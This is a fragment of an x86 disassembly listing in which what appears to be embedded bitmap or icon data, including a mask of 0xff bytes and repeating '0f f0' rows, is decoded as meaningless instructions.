  402592:	45                   	inc    %ebp
  402593:	45                   	inc    %ebp
  402594:	45                   	inc    %ebp
  402595:	45                   	inc    %ebp
  402596:	35 45 49 2b 2b       	xor    $0x2b2b4945,%eax
  40259b:	2b 2b                	sub    (%ebx),%ebp
  40259d:	2b 2b                	sub    (%ebx),%ebp
  40259f:	2b 2b                	sub    (%ebx),%ebp
  4025a1:	2b 2b                	sub    (%ebx),%ebp
  4025a3:	2b 2b                	sub    (%ebx),%ebp
  4025a5:	2b 2b                	sub    (%ebx),%ebp
  4025a7:	3f                   	aas
  4025a8:	45                   	inc    %ebp
  4025a9:	35 45 45 35 45       	xor    $0x45354545,%eax
  4025ae:	41                   	inc    %ecx
  4025af:	45                   	inc    %ebp
  4025b0:	41                   	inc    %ecx
  4025b1:	18 49 49             	sbb    %cl,0x49(%ecx)
  4025b4:	48                   	dec    %eax
  4025b5:	3f                   	aas
  4025b6:	3f                   	aas
  4025b7:	49                   	dec    %ecx
  4025b8:	3f                   	aas
  4025b9:	3f                   	aas
  4025ba:	48                   	dec    %eax
  4025bb:	33 00                	xor    (%eax),%eax
  4025bd:	00 00                	add    %al,(%eax)
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	00 00                	add    %al,(%eax)
  4025c3:	00 33                	add    %dh,(%ebx)
  4025c5:	48                   	dec    %eax
  4025c6:	3f                   	aas
  4025c7:	3f                   	aas
  4025c8:	49                   	dec    %ecx
  4025c9:	45                   	inc    %ebp
  4025ca:	41                   	inc    %ecx
  4025cb:	41                   	inc    %ecx
  4025cc:	45                   	inc    %ebp
  4025cd:	41                   	inc    %ecx
  4025ce:	45                   	inc    %ebp
  4025cf:	41                   	inc    %ecx
  4025d0:	45                   	inc    %ebp
  4025d1:	41                   	inc    %ecx
  4025d2:	35 45 35 45 45       	xor    $0x45453545,%eax
  4025d7:	45                   	inc    %ebp
  4025d8:	45                   	inc    %ebp
  4025d9:	1d 2f 49 2c 2b       	sbb    $0x2b2c492f,%eax
  4025de:	2b 2b                	sub    (%ebx),%ebp
  4025e0:	2b 2b                	sub    (%ebx),%ebp
  4025e2:	2b 2c 49             	sub    (%ecx,%ecx,2),%ebp
  4025e5:	2f                   	das
  4025e6:	45                   	inc    %ebp
  4025e7:	35 45 45 45 45       	xor    $0x45454545,%eax
  4025ec:	35 45 45 41 2f       	xor    $0x2f414545,%eax
  4025f1:	2c 49                	sub    $0x49,%al
  4025f3:	49                   	dec    %ecx
  4025f4:	3f                   	aas
  4025f5:	49                   	dec    %ecx
  4025f6:	49                   	dec    %ecx
  4025f7:	3f                   	aas
  4025f8:	3f                   	aas
  4025f9:	3f                   	aas
  4025fa:	3f                   	aas
  4025fb:	33 00                	xor    (%eax),%eax
  4025fd:	00 00                	add    %al,(%eax)
  4025ff:	00 00                	add    %al,(%eax)
  402601:	00 00                	add    %al,(%eax)
  402603:	00 33                	add    %dh,(%ebx)
  402605:	49                   	dec    %ecx
  402606:	3f                   	aas
  402607:	49                   	dec    %ecx
  402608:	49                   	dec    %ecx
  402609:	14 45                	adc    $0x45,%al
  40260b:	45                   	inc    %ebp
  40260c:	41                   	inc    %ecx
  40260d:	45                   	inc    %ebp
  40260e:	45                   	inc    %ebp
  40260f:	45                   	inc    %ebp
  402610:	45                   	inc    %ebp
  402611:	45                   	inc    %ebp
  402612:	45                   	inc    %ebp
  402613:	45                   	inc    %ebp
  402614:	08 45 45             	or     %al,0x45(%ebp)
  402617:	45                   	inc    %ebp
  402618:	45                   	inc    %ebp
  402619:	45                   	inc    %ebp
  40261a:	45                   	inc    %ebp
  40261b:	45                   	inc    %ebp
  40261c:	1d 45 1d 14 14       	sbb    $0x14141d45,%eax
  402621:	1d 45 45 45 45       	sbb    $0x45454545,%eax
  402626:	1d 14 45 45 45       	sbb    $0x45454514,%eax
  40262b:	45                   	inc    %ebp
  40262c:	45                   	inc    %ebp
  40262d:	41                   	inc    %ecx
  40262e:	45                   	inc    %ebp
  40262f:	18 49 49             	sbb    %cl,0x49(%ecx)
  402632:	49                   	dec    %ecx
  402633:	48                   	dec    %eax
  402634:	49                   	dec    %ecx
  402635:	48                   	dec    %eax
  402636:	3f                   	aas
  402637:	3f                   	aas
  402638:	49                   	dec    %ecx
  402639:	3f                   	aas
  40263a:	48                   	dec    %eax
  40263b:	33 00                	xor    (%eax),%eax
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 00                	add    %al,(%eax)
  402641:	00 00                	add    %al,(%eax)
  402643:	00 33                	add    %dh,(%ebx)
  402645:	48                   	dec    %eax
  402646:	3f                   	aas
  402647:	49                   	dec    %ecx
  402648:	3f                   	aas
  402649:	49                   	dec    %ecx
  40264a:	45                   	inc    %ebp
  40264b:	45                   	inc    %ebp
  40264c:	45                   	inc    %ebp
  40264d:	45                   	inc    %ebp
  40264e:	45                   	inc    %ebp
  40264f:	41                   	inc    %ecx
  402650:	45                   	inc    %ebp
  402651:	45                   	inc    %ebp
  402652:	08 45 45             	or     %al,0x45(%ebp)
  402655:	45                   	inc    %ebp
  402656:	25 45 14 1d 14       	and    $0x141d1445,%eax
  40265b:	45                   	inc    %ebp
  40265c:	14 45                	adc    $0x45,%al
  40265e:	14 45                	adc    $0x45,%al
  402660:	14 45                	adc    $0x45,%al
  402662:	14 14                	adc    $0x14,%al
  402664:	1d 14 45 14 45       	sbb    $0x45144514,%eax
  402669:	45                   	inc    %ebp
  40266a:	45                   	inc    %ebp
  40266b:	25 45 45 3f 2c       	and    $0x2c3f4545,%eax
  402670:	49                   	dec    %ecx
  402671:	48                   	dec    %eax
  402672:	49                   	dec    %ecx
  402673:	48                   	dec    %eax
  402674:	3f                   	aas
  402675:	49                   	dec    %ecx
  402676:	3f                   	aas
  402677:	49                   	dec    %ecx
  402678:	3f                   	aas
  402679:	3f                   	aas
  40267a:	49                   	dec    %ecx
  40267b:	33 00                	xor    (%eax),%eax
  40267d:	00 00                	add    %al,(%eax)
  40267f:	00 00                	add    %al,(%eax)
  402681:	00 00                	add    %al,(%eax)
  402683:	00 33                	add    %dh,(%ebx)
  402685:	48                   	dec    %eax
  402686:	3f                   	aas
  402687:	49                   	dec    %ecx
  402688:	49                   	dec    %ecx
  402689:	49                   	dec    %ecx
  40268a:	18 41 45             	sbb    %al,0x45(%ecx)
  40268d:	45                   	inc    %ebp
  40268e:	45                   	inc    %ebp
  40268f:	45                   	inc    %ebp
  402690:	45                   	inc    %ebp
  402691:	45                   	inc    %ebp
  402692:	45                   	inc    %ebp
  402693:	45                   	inc    %ebp
  402694:	25 45 14 45 14       	and    $0x14451445,%eax
  402699:	45                   	inc    %ebp
  40269a:	14 14                	adc    $0x14,%al
  40269c:	1d 14 14 14 14       	sbb    $0x14141414,%eax
  4026a1:	14 1d                	adc    $0x1d,%al
  4026a3:	14 14                	adc    $0x14,%al
  4026a5:	45                   	inc    %ebp
  4026a6:	14 45                	adc    $0x45,%al
  4026a8:	14 45                	adc    $0x45,%al
  4026aa:	25 45 2f 49 2c       	and    $0x2c492f45,%eax
  4026af:	49                   	dec    %ecx
  4026b0:	49                   	dec    %ecx
  4026b1:	48                   	dec    %eax
  4026b2:	49                   	dec    %ecx
  4026b3:	49                   	dec    %ecx
  4026b4:	49                   	dec    %ecx
  4026b5:	48                   	dec    %eax
  4026b6:	3f                   	aas
  4026b7:	48                   	dec    %eax
  4026b8:	3f                   	aas
  4026b9:	3f                   	aas
  4026ba:	48                   	dec    %eax
  4026bb:	33 00                	xor    (%eax),%eax
  4026bd:	00 00                	add    %al,(%eax)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	00 00                	add    %al,(%eax)
  4026c3:	00 01                	add    %al,(%ecx)
  4026c5:	48                   	dec    %eax
  4026c6:	49                   	dec    %ecx
  4026c7:	3f                   	aas
  4026c8:	49                   	dec    %ecx
  4026c9:	3f                   	aas
  4026ca:	2c 18                	sub    $0x18,%al
  4026cc:	08 45 45             	or     %al,0x45(%ebp)
  4026cf:	45                   	inc    %ebp
  4026d0:	45                   	inc    %ebp
  4026d1:	45                   	inc    %ebp
  4026d2:	45                   	inc    %ebp
  4026d3:	45                   	inc    %ebp
  4026d4:	45                   	inc    %ebp
  4026d5:	14 45                	adc    $0x45,%al
  4026d7:	14 45                	adc    $0x45,%al
  4026d9:	14 45                	adc    $0x45,%al
  4026db:	14 14                	adc    $0x14,%al
  4026dd:	14 14                	adc    $0x14,%al
  4026df:	14 45                	adc    $0x45,%al
  4026e1:	14 14                	adc    $0x14,%al
  4026e3:	14 14                	adc    $0x14,%al
  4026e5:	14 14                	adc    $0x14,%al
  4026e7:	14 45                	adc    $0x45,%al
  4026e9:	14 14                	adc    $0x14,%al
  4026eb:	49                   	dec    %ecx
  4026ec:	2c 2c                	sub    $0x2c,%al
  4026ee:	49                   	dec    %ecx
  4026ef:	2c 48                	sub    $0x48,%al
  4026f1:	49                   	dec    %ecx
  4026f2:	48                   	dec    %eax
  4026f3:	49                   	dec    %ecx
  4026f4:	48                   	dec    %eax
  4026f5:	49                   	dec    %ecx
  4026f6:	49                   	dec    %ecx
  4026f7:	3f                   	aas
  4026f8:	49                   	dec    %ecx
  4026f9:	49                   	dec    %ecx
  4026fa:	49                   	dec    %ecx
  4026fb:	01 00                	add    %eax,(%eax)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	00 00                	add    %al,(%eax)
  402701:	00 00                	add    %al,(%eax)
  402703:	00 26                	add    %ah,(%esi)
  402705:	49                   	dec    %ecx
  402706:	3f                   	aas
  402707:	48                   	dec    %eax
  402708:	49                   	dec    %ecx
  402709:	49                   	dec    %ecx
  40270a:	49                   	dec    %ecx
  40270b:	49                   	dec    %ecx
  40270c:	18 45 45             	sbb    %al,0x45(%ebp)
  40270f:	14 14                	adc    $0x14,%al
  402711:	45                   	inc    %ebp
  402712:	14 14                	adc    $0x14,%al
  402714:	45                   	inc    %ebp
  402715:	14 14                	adc    $0x14,%al
  402717:	45                   	inc    %ebp
  402718:	14 14                	adc    $0x14,%al
  40271a:	14 14                	adc    $0x14,%al
  40271c:	14 45                	adc    $0x45,%al
  40271e:	14 14                	adc    $0x14,%al
  402720:	14 14                	adc    $0x14,%al
  402722:	14 45                	adc    $0x45,%al
  402724:	14 45                	adc    $0x45,%al
  402726:	45                   	inc    %ebp
  402727:	14 2f                	adc    $0x2f,%al
  402729:	49                   	dec    %ecx
  40272a:	2c 2c                	sub    $0x2c,%al
  40272c:	49                   	dec    %ecx
  40272d:	48                   	dec    %eax
  40272e:	2c 49                	sub    $0x49,%al
  402730:	49                   	dec    %ecx
  402731:	48                   	dec    %eax
  402732:	49                   	dec    %ecx
  402733:	49                   	dec    %ecx
  402734:	49                   	dec    %ecx
  402735:	48                   	dec    %eax
  402736:	3f                   	aas
  402737:	48                   	dec    %eax
  402738:	49                   	dec    %ecx
  402739:	48                   	dec    %eax
  40273a:	3f                   	aas
  40273b:	09 00                	or     %eax,(%eax)
	...
  402745:	34 48                	xor    $0x48,%al
  402747:	49                   	dec    %ecx
  402748:	49                   	dec    %ecx
  402749:	48                   	dec    %eax
  40274a:	49                   	dec    %ecx
  40274b:	49                   	dec    %ecx
  40274c:	2c 49                	sub    $0x49,%al
  40274e:	14 14                	adc    $0x14,%al
  402750:	45                   	inc    %ebp
  402751:	14 14                	adc    $0x14,%al
  402753:	14 14                	adc    $0x14,%al
  402755:	45                   	inc    %ebp
  402756:	14 14                	adc    $0x14,%al
  402758:	14 14                	adc    $0x14,%al
  40275a:	14 14                	adc    $0x14,%al
  40275c:	2f                   	das
  40275d:	14 14                	adc    $0x14,%al
  40275f:	14 14                	adc    $0x14,%al
  402761:	14 14                	adc    $0x14,%al
  402763:	14 2f                	adc    $0x2f,%al
  402765:	3f                   	aas
  402766:	49                   	dec    %ecx
  402767:	2c 2c                	sub    $0x2c,%al
  402769:	2c 48                	sub    $0x48,%al
  40276b:	2c 49                	sub    $0x49,%al
  40276d:	2c 48                	sub    $0x48,%al
  40276f:	49                   	dec    %ecx
  402770:	48                   	dec    %eax
  402771:	49                   	dec    %ecx
  402772:	49                   	dec    %ecx
  402773:	48                   	dec    %eax
  402774:	48                   	dec    %eax
  402775:	49                   	dec    %ecx
  402776:	49                   	dec    %ecx
  402777:	49                   	dec    %ecx
  402778:	3f                   	aas
  402779:	48                   	dec    %eax
  40277a:	0f 00 00             	sldt   (%eax)
	...
  402785:	01 2c 48             	add    %ebp,(%eax,%ecx,2)
  402788:	49                   	dec    %ecx
  402789:	49                   	dec    %ecx
  40278a:	48                   	dec    %eax
  40278b:	49                   	dec    %ecx
  40278c:	49                   	dec    %ecx
  40278d:	2c 49                	sub    $0x49,%al
  40278f:	18 14 14             	sbb    %dl,(%esp,%edx,1)
  402792:	45                   	inc    %ebp
  402793:	14 14                	adc    $0x14,%al
  402795:	14 14                	adc    $0x14,%al
  402797:	45                   	inc    %ebp
  402798:	14 14                	adc    $0x14,%al
  40279a:	2f                   	das
  40279b:	3f                   	aas
  40279c:	2c 2c                	sub    $0x2c,%al
  40279e:	2c 49                	sub    $0x49,%al
  4027a0:	49                   	dec    %ecx
  4027a1:	2c 2c                	sub    $0x2c,%al
  4027a3:	2c 2c                	sub    $0x2c,%al
  4027a5:	2c 2c                	sub    $0x2c,%al
  4027a7:	2c 48                	sub    $0x48,%al
  4027a9:	2c 2c                	sub    $0x2c,%al
  4027ab:	48                   	dec    %eax
  4027ac:	2c 49                	sub    $0x49,%al
  4027ae:	48                   	dec    %eax
  4027af:	2c 49                	sub    $0x49,%al
  4027b1:	48                   	dec    %eax
  4027b2:	49                   	dec    %ecx
  4027b3:	49                   	dec    %ecx
  4027b4:	49                   	dec    %ecx
  4027b5:	48                   	dec    %eax
  4027b6:	49                   	dec    %ecx
  4027b7:	48                   	dec    %eax
  4027b8:	49                   	dec    %ecx
  4027b9:	2c 01                	sub    $0x1,%al
	...
  4027c3:	00 00                	add    %al,(%eax)
  4027c5:	00 0f                	add    %cl,(%edi)
  4027c7:	2c 49                	sub    $0x49,%al
  4027c9:	48                   	dec    %eax
  4027ca:	49                   	dec    %ecx
  4027cb:	48                   	dec    %eax
  4027cc:	49                   	dec    %ecx
  4027cd:	49                   	dec    %ecx
  4027ce:	49                   	dec    %ecx
  4027cf:	2c 2c                	sub    $0x2c,%al
  4027d1:	49                   	dec    %ecx
  4027d2:	18 18                	sbb    %bl,(%eax)
  4027d4:	2f                   	das
  4027d5:	18 2f                	sbb    %ch,(%edi)
  4027d7:	49                   	dec    %ecx
  4027d8:	3f                   	aas
  4027d9:	49                   	dec    %ecx
  4027da:	2c 2c                	sub    $0x2c,%al
  4027dc:	2c 2c                	sub    $0x2c,%al
  4027de:	2c 2c                	sub    $0x2c,%al
  4027e0:	2c 2c                	sub    $0x2c,%al
  4027e2:	2c 2c                	sub    $0x2c,%al
  4027e4:	2c 2c                	sub    $0x2c,%al
  4027e6:	48                   	dec    %eax
  4027e7:	2c 2c                	sub    $0x2c,%al
  4027e9:	49                   	dec    %ecx
  4027ea:	2c 49                	sub    $0x49,%al
  4027ec:	2c 48                	sub    $0x48,%al
  4027ee:	2c 49                	sub    $0x49,%al
  4027f0:	49                   	dec    %ecx
  4027f1:	2c 48                	sub    $0x48,%al
  4027f3:	49                   	dec    %ecx
  4027f4:	48                   	dec    %eax
  4027f5:	49                   	dec    %ecx
  4027f6:	48                   	dec    %eax
  4027f7:	49                   	dec    %ecx
  4027f8:	2c 0f                	sub    $0xf,%al
	...
  402806:	0d 34 2c 48 49       	or     $0x49482c34,%eax
  40280b:	49                   	dec    %ecx
  40280c:	2c 49                	sub    $0x49,%al
  40280e:	2c 49                	sub    $0x49,%al
  402810:	2c 2c                	sub    $0x2c,%al
  402812:	2c 2c                	sub    $0x2c,%al
  402814:	2c 2c                	sub    $0x2c,%al
  402816:	2c 2c                	sub    $0x2c,%al
  402818:	2c 2c                	sub    $0x2c,%al
  40281a:	2c 2c                	sub    $0x2c,%al
  40281c:	2c 2c                	sub    $0x2c,%al
  40281e:	2c 2c                	sub    $0x2c,%al
  402820:	2c 2c                	sub    $0x2c,%al
  402822:	48                   	dec    %eax
  402823:	2c 2c                	sub    $0x2c,%al
  402825:	49                   	dec    %ecx
  402826:	2c 2c                	sub    $0x2c,%al
  402828:	48                   	dec    %eax
  402829:	2c 48                	sub    $0x48,%al
  40282b:	2c 49                	sub    $0x49,%al
  40282d:	2c 49                	sub    $0x49,%al
  40282f:	2c 48                	sub    $0x48,%al
  402831:	49                   	dec    %ecx
  402832:	48                   	dec    %eax
  402833:	49                   	dec    %ecx
  402834:	49                   	dec    %ecx
  402835:	49                   	dec    %ecx
  402836:	48                   	dec    %eax
  402837:	2c 17                	sub    $0x17,%al
  402839:	0d 00 00 00 00       	or     $0x0,%eax
	...
  402846:	00 0d 34 2c 2c 2c    	add    %cl,0x2c2c2c34
  40284c:	49                   	dec    %ecx
  40284d:	48                   	dec    %eax
  40284e:	49                   	dec    %ecx
  40284f:	49                   	dec    %ecx
  402850:	49                   	dec    %ecx
  402851:	49                   	dec    %ecx
  402852:	49                   	dec    %ecx
  402853:	49                   	dec    %ecx
  402854:	49                   	dec    %ecx
  402855:	49                   	dec    %ecx
  402856:	49                   	dec    %ecx
  402857:	49                   	dec    %ecx
  402858:	2c 49                	sub    $0x49,%al
  40285a:	2c 49                	sub    $0x49,%al
  40285c:	2c 48                	sub    $0x48,%al
  40285e:	2c 48                	sub    $0x48,%al
  402860:	48                   	dec    %eax
  402861:	2c 49                	sub    $0x49,%al
  402863:	2c 48                	sub    $0x48,%al
  402865:	2c 48                	sub    $0x48,%al
  402867:	2c 49                	sub    $0x49,%al
  402869:	2c 49                	sub    $0x49,%al
  40286b:	2c 49                	sub    $0x49,%al
  40286d:	48                   	dec    %eax
  40286e:	49                   	dec    %ecx
  40286f:	48                   	dec    %eax
  402870:	49                   	dec    %ecx
  402871:	2c 49                	sub    $0x49,%al
  402873:	48                   	dec    %eax
  402874:	2c 2c                	sub    $0x2c,%al
  402876:	2c 04                	sub    $0x4,%al
  402878:	0d 00 00 00 00       	or     $0x0,%eax
	...
  402889:	37                   	aaa
  40288a:	04 2c                	add    $0x2c,%al
  40288c:	2c 2b                	sub    $0x2b,%al
  40288e:	2b 2b                	sub    (%ebx),%ebp
  402890:	2b 2b                	sub    (%ebx),%ebp
  402892:	2b 2b                	sub    (%ebx),%ebp
  402894:	2b 2b                	sub    (%ebx),%ebp
  402896:	2b 2b                	sub    (%ebx),%ebp
  402898:	2b 2b                	sub    (%ebx),%ebp
  40289a:	2b 2b                	sub    (%ebx),%ebp
  40289c:	2b 2b                	sub    (%ebx),%ebp
  40289e:	2b 2b                	sub    (%ebx),%ebp
  4028a0:	2b 2b                	sub    (%ebx),%ebp
  4028a2:	2b 2b                	sub    (%ebx),%ebp
  4028a4:	2b 2b                	sub    (%ebx),%ebp
  4028a6:	2b 2b                	sub    (%ebx),%ebp
  4028a8:	2b 2c 2b             	sub    (%ebx,%ebp,1),%ebp
  4028ab:	2b 2b                	sub    (%ebx),%ebp
  4028ad:	2b 2b                	sub    (%ebx),%ebp
  4028af:	2b 2c 2b             	sub    (%ebx,%ebp,1),%ebp
  4028b2:	2c 2b                	sub    $0x2b,%al
  4028b4:	2c 34                	sub    $0x34,%al
  4028b6:	20 00                	and    %al,(%eax)
	...
  4028c8:	00 00                	add    %al,(%eax)
  4028ca:	00 26                	add    %ah,(%esi)
  4028cc:	37                   	aaa
  4028cd:	40                   	inc    %eax
  4028ce:	1a 40 29             	sbb    0x29(%eax),%al
  4028d1:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028d4:	40                   	inc    %eax
  4028d5:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028d8:	40                   	inc    %eax
  4028d9:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028dc:	40                   	inc    %eax
  4028dd:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028e0:	40                   	inc    %eax
  4028e1:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028e4:	40                   	inc    %eax
  4028e5:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028e8:	40                   	inc    %eax
  4028e9:	1a 40 29             	sbb    0x29(%eax),%al
  4028ec:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028ef:	40                   	inc    %eax
  4028f0:	1a 40 1a             	sbb    0x1a(%eax),%al
  4028f3:	37                   	aaa
  4028f4:	26 00 00             	add    %al,%es:(%eax)
	...
  4029ff:	00 ff                	add    %bh,%bh
  402a01:	ff                   	(bad)
  402a02:	ff                   	(bad)
  402a03:	ff                   	(bad)
  402a04:	ff                   	(bad)
  402a05:	ff                   	(bad)
  402a06:	ff                   	(bad)
  402a07:	ff                   	(bad)
  402a08:	ff                   	(bad)
  402a09:	ff                   	(bad)
  402a0a:	ff                   	(bad)
  402a0b:	ff                   	(bad)
  402a0c:	ff                   	(bad)
  402a0d:	ff                   	(bad)
  402a0e:	ff                   	(bad)
  402a0f:	ff                   	(bad)
  402a10:	ff                   	(bad)
  402a11:	ff                   	(bad)
  402a12:	ff                   	(bad)
  402a13:	ff                   	(bad)
  402a14:	ff                   	(bad)
  402a15:	ff                   	(bad)
  402a16:	ff                   	(bad)
  402a17:	ff                   	(bad)
  402a18:	ff                   	(bad)
  402a19:	ff                   	(bad)
  402a1a:	ff                   	(bad)
  402a1b:	ff                   	(bad)
  402a1c:	ff                   	(bad)
  402a1d:	ff                   	(bad)
  402a1e:	ff                   	(bad)
  402a1f:	ff                   	(bad)
  402a20:	ff c0                	inc    %eax
  402a22:	00 00                	add    %al,(%eax)
  402a24:	00 00                	add    %al,(%eax)
  402a26:	03 ff                	add    %edi,%edi
  402a28:	ff 00                	incl   (%eax)
  402a2a:	00 00                	add    %al,(%eax)
  402a2c:	00 00                	add    %al,(%eax)
  402a2e:	00 ff                	add    %bh,%bh
  402a30:	fe 00                	incb   (%eax)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	00 00                	add    %al,(%eax)
  402a36:	00 7f fc             	add    %bh,-0x4(%edi)
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	00 00                	add    %al,(%eax)
  402a3d:	00 00                	add    %al,(%eax)
  402a3f:	3f                   	aas
  402a40:	f8                   	clc
  402a41:	00 00                	add    %al,(%eax)
  402a43:	00 00                	add    %al,(%eax)
  402a45:	00 00                	add    %al,(%eax)
  402a47:	1f                   	pop    %ds
  402a48:	f8                   	clc
  402a49:	00 00                	add    %al,(%eax)
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	1f                   	pop    %ds
  402a50:	f0 00 00             	lock add %al,(%eax)
  402a53:	00 00                	add    %al,(%eax)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	0f f0                	(bad)
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	00 00                	add    %al,(%eax)
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	0f f0                	(bad)
  402a61:	00 00                	add    %al,(%eax)
  402a63:	00 00                	add    %al,(%eax)
  402a65:	00 00                	add    %al,(%eax)
  402a67:	0f f0                	(bad)
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 00                	add    %al,(%eax)
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0f f0                	(bad)
  402a71:	00 00                	add    %al,(%eax)
  402a73:	00 00                	add    %al,(%eax)
  402a75:	00 00                	add    %al,(%eax)
  402a77:	0f f0                	(bad)
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	00 00                	add    %al,(%eax)
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	0f f0                	(bad)
  402a81:	00 00                	add    %al,(%eax)
  402a83:	00 00                	add    %al,(%eax)
  402a85:	00 00                	add    %al,(%eax)
  402a87:	0f f0                	(bad)
  402a89:	00 00                	add    %al,(%eax)
  402a8b:	00 00                	add    %al,(%eax)
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	0f f0                	(bad)
  402a91:	00 00                	add    %al,(%eax)
  402a93:	00 00                	add    %al,(%eax)
  402a95:	00 00                	add    %al,(%eax)
  402a97:	0f f0                	(bad)
  402a99:	00 00                	add    %al,(%eax)
  402a9b:	00 00                	add    %al,(%eax)
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	0f f0                	(bad)
  402aa1:	00 00                	add    %al,(%eax)
  402aa3:	00 00                	add    %al,(%eax)
  402aa5:	00 00                	add    %al,(%eax)
  402aa7:	0f f0                	(bad)
  402aa9:	00 00                	add    %al,(%eax)
  402aab:	00 00                	add    %al,(%eax)
  402aad:	00 00                	add    %al,(%eax)
  402aaf:	0f f0                	(bad)
  402ab1:	00 00                	add    %al,(%eax)
  402ab3:	00 00                	add    %al,(%eax)
  402ab5:	00 00                	add    %al,(%eax)
  402ab7:	0f f0                	(bad)
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	00 00                	add    %al,(%eax)
  402abd:	00 00                	add    %al,(%eax)
  402abf:	0f f0                	(bad)
  402ac1:	00 00                	add    %al,(%eax)
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	00 00                	add    %al,(%eax)
  402ac7:	0f f0                	(bad)
  402ac9:	00 00                	add    %al,(%eax)
  402acb:	00 00                	add    %al,(%eax)
  402acd:	00 00                	add    %al,(%eax)
  402acf:	0f f0                	(bad)
  402ad1:	00 00                	add    %al,(%eax)
  402ad3:	00 00                	add    %al,(%eax)
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	0f f0                	(bad)
  402ad9:	00 00                	add    %al,(%eax)
  402adb:	00 00                	add    %al,(%eax)
  402add:	00 00                	add    %al,(%eax)
  402adf:	0f f0                	(bad)
  402ae1:	00 00                	add    %al,(%eax)
  402ae3:	00 00                	add    %al,(%eax)
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	0f f0                	(bad)
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	00 00                	add    %al,(%eax)
  402aef:	0f f0                	(bad)
  402af1:	00 00                	add    %al,(%eax)
  402af3:	00 00                	add    %al,(%eax)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	0f f0                	(bad)
  402af9:	00 00                	add    %al,(%eax)
  402afb:	00 00                	add    %al,(%eax)
  402afd:	00 00                	add    %al,(%eax)
  402aff:	0f f0                	(bad)
  402b01:	00 00                	add    %al,(%eax)
  402b03:	00 00                	add    %al,(%eax)
  402b05:	00 00                	add    %al,(%eax)
  402b07:	0f f0                	(bad)
  402b09:	00 00                	add    %al,(%eax)
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	00 00                	add    %al,(%eax)
  402b0f:	0f f0                	(bad)
  402b11:	00 00                	add    %al,(%eax)
  402b13:	00 00                	add    %al,(%eax)
  402b15:	00 00                	add    %al,(%eax)
  402b17:	0f f0                	(bad)
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	00 00                	add    %al,(%eax)
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	0f f0                	(bad)
  402b21:	00 00                	add    %al,(%eax)
  402b23:	00 00                	add    %al,(%eax)
  402b25:	00 00                	add    %al,(%eax)
  402b27:	0f f0                	(bad)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	00 00                	add    %al,(%eax)
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	0f f0                	(bad)
  402b31:	00 00                	add    %al,(%eax)
  402b33:	00 00                	add    %al,(%eax)
  402b35:	00 00                	add    %al,(%eax)
  402b37:	0f f0                	(bad)
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	00 00                	add    %al,(%eax)
  402b3d:	00 00                	add    %al,(%eax)
  402b3f:	0f f0                	(bad)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	00 00                	add    %al,(%eax)
  402b45:	00 00                	add    %al,(%eax)
  402b47:	0f f0                	(bad)
  402b49:	00 00                	add    %al,(%eax)
  402b4b:	00 00                	add    %al,(%eax)
  402b4d:	00 00                	add    %al,(%eax)
  402b4f:	0f f0                	(bad)
  402b51:	00 00                	add    %al,(%eax)
  402b53:	00 00                	add    %al,(%eax)
  402b55:	00 00                	add    %al,(%eax)
  402b57:	0f f0                	(bad)
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	00 00                	add    %al,(%eax)
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	0f f0                	(bad)
  402b61:	00 00                	add    %al,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	00 00                	add    %al,(%eax)
  402b67:	0f f0                	(bad)
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	00 00                	add    %al,(%eax)
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0f f0                	(bad)
  402b71:	00 00                	add    %al,(%eax)
  402b73:	00 00                	add    %al,(%eax)
  402b75:	00 00                	add    %al,(%eax)
  402b77:	0f f0                	(bad)
  402b79:	00 00                	add    %al,(%eax)
  402b7b:	00 00                	add    %al,(%eax)
  402b7d:	00 00                	add    %al,(%eax)
  402b7f:	0f f0                	(bad)
  402b81:	00 00                	add    %al,(%eax)
  402b83:	00 00                	add    %al,(%eax)
  402b85:	00 00                	add    %al,(%eax)
  402b87:	0f f0                	(bad)
  402b89:	00 00                	add    %al,(%eax)
  402b8b:	00 00                	add    %al,(%eax)
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0f f0                	(bad)
  402b91:	00 00                	add    %al,(%eax)
  402b93:	00 00                	add    %al,(%eax)
  402b95:	00 00                	add    %al,(%eax)
  402b97:	0f f0                	(bad)
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	00 00                	add    %al,(%eax)
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	0f f0                	(bad)
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	00 00                	add    %al,(%eax)
